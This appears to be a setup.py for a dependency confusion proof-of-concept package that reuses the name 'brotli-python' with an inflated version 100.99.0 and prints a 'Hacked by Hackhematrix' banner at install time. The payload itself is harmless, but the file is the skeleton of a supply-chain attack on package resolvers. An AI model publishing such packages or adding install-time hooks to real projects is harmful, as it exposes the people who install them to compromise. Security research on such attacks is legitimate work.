from setuptools import setup

def hackhematrix_message():
    print("\n" + "*"*60)
    print("  ⚠️  Dependency Confusion PoC Triggered")
    print("  Hacked by Hackhematrix (PoC demonstration only)")
    print("*"*60 + "\n")

# Trigger banner when setup.py is run (install time)
hackhematrix_message()

setup(
    name="brotli-python",
    version="100.99.0",
    description="PoC package for dependency confusion demo",
    py_modules=["dummy"],
)
